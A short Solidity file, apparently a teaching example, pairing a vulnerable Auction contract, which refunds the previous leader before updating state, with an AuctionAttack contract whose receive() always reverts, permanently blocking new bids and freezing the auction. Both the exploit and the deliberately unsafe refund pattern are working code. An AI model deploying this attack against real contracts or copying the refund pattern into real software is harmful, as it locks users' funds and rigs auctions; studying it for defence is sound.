// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

contract Auction {
    
    address payable currentLeader;
    uint highestBid;

    function bid() public payable {
        require(msg.value > highestBid);

        currentLeader.transfer(highestBid);

        currentLeader = payable(msg.sender);
        highestBid = msg.value;
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
    
    function getLeader() public view returns (address) {
        return currentLeader;
    }
}

contract AuctionAttack {
    
    Auction auction;
    
    constructor(address payable addr) payable {
        auction = Auction(addr);
    }
    
    function attack() public payable {
        
        auction.bid{value: msg.value}();
        
    }
    
    receive() external payable {
        revert();
    }
}